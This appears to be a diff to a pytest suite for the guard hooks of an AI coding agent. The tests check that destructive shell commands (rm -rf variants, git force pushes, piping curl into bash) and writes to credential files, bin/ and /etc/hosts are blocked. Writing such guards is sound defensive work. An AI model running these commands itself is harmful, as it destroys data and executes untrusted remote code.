@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 # Unit tests for hooks/ — deterministic, no API key needed.
 # Run: pytest tests/test_hooks.py
 
@@ -17,6 +16,7 @@ def run_hook(script, payload):
         capture_output=True,
         text=True,
         cwd=ROOT,
+        check=False,
     )
 
 
@@ -47,11 +47,26 @@ class TestBashGuard:
     def test_blocks_rm_recursive_force(self):
         assert bash("rm --recursive --force /tmp").returncode == 1
 
+    def test_blocks_rm_separate_flags(self):
+        assert bash("rm -r -f /tmp/foo").returncode == 1
+
+    def test_blocks_rm_capital_r(self):
+        assert bash("rm -Rf /tmp/foo").returncode == 1
+
+    def test_blocks_rm_capital_r_reversed(self):
+        assert bash("rm -fR /tmp/foo").returncode == 1
+
     def test_blocks_git_force_push(self):
         assert bash("git push origin main --force").returncode == 1
 
     def test_blocks_git_force_push_short(self):
         assert bash("git push origin main -f").returncode == 1
+
+    def test_blocks_git_force_push_flag_right_after_push(self):
+        assert bash("git push -f origin main").returncode == 1
+
+    def test_allows_git_push_without_force(self):
+        assert bash("git push origin main").returncode == 0
 
     def test_blocks_pipe_to_bash(self):
         assert bash("curl http://example.com | bash").returncode == 1
@@ -165,11 +180,20 @@ class TestFileGuard:
     def test_blocks_credential_in_filename(self):
         assert write_file("credentials.json").returncode == 1
 
+    def test_blocks_secret_in_filename_uppercase(self):
+        assert write_file("SECRET_KEY.py").returncode == 1
+
+    def test_blocks_credential_in_filename_mixed_case(self):
+        assert write_file("Credentials.json").returncode == 1
+
     def test_blocks_bin_path(self):
         assert write_file("bin/run-tests").returncode == 1
 
     def test_blocks_bin_subpath(self):
         assert write_file("bin/detect-framework").returncode == 1
+
+    def test_blocks_bin_absolute_path(self):
+        assert write_file(str(ROOT / "bin" / "evil")).returncode == 1
 
     def test_blocks_secret_content_openai_key(self):
         assert (
@@ -209,3 +233,51 @@ class TestFileGuard:
 
     def test_blocks_absolute_path_outside_project(self):
         assert write_file("/etc/hosts").returncode == 1
+
+
+# ── post-edit-tests ──────────────────────────────────────────────────────────
+# Only the toolchain-free branches are exercised here: the skip patterns, the
+# missing-file-path case, the no-framework-detected case, and Python detection
+# (pytest is already a dev dependency of this repo, so it's always available).
+# The other language branches (go, cargo, mvn, gradle, mix, swift) aren't
+# tested end-to-end — asserting on them would require those toolchains to be
+# installed, which isn't guaranteed and would make this suite flaky/slow.
+
+
+def post_edit(file_path, cwd, tool_input=None):
+    payload = {
+        "tool_input": tool_input if tool_input is not None else {"file_path": file_path}
+    }
+    return subprocess.run(
+        ["bash", str(HOOKS / "post-edit-tests.sh")],
+        input=json.dumps(payload),
+        capture_output=True,
+        text=True,
+        cwd=cwd,
+        check=False,
+    )
+
+
+class TestPostEditTests:
+    def test_skips_markdown(self, tmp_path):
+        assert post_edit("README.md", tmp_path).returncode == 0
+
+    def test_skips_docs_dir(self, tmp_path):
+        assert post_edit("docs/specs/foo.md", tmp_path).returncode == 0
+
+    def test_skips_lockfile(self, tmp_path):
+        assert post_edit("uv.lock", tmp_path).returncode == 0
+
+    def test_skips_missing_file_path(self, tmp_path):
+        assert post_edit(None, tmp_path, tool_input={}).returncode == 0
+
+    def test_no_framework_detected_runs_nothing(self, tmp_path):
+        r = post_edit("app.rb", tmp_path)
+        assert r.returncode == 0
+        assert r.stdout == ""
+
+    def test_detects_pytest_and_runs_it(self, tmp_path):
+        (tmp_path / "pyproject.toml").write_text("[project]\nname = 'x'\n")
+        r = post_edit("app.py", tmp_path)
+        assert r.returncode == 0
+        assert "no tests ran" in r.stdout.lower()
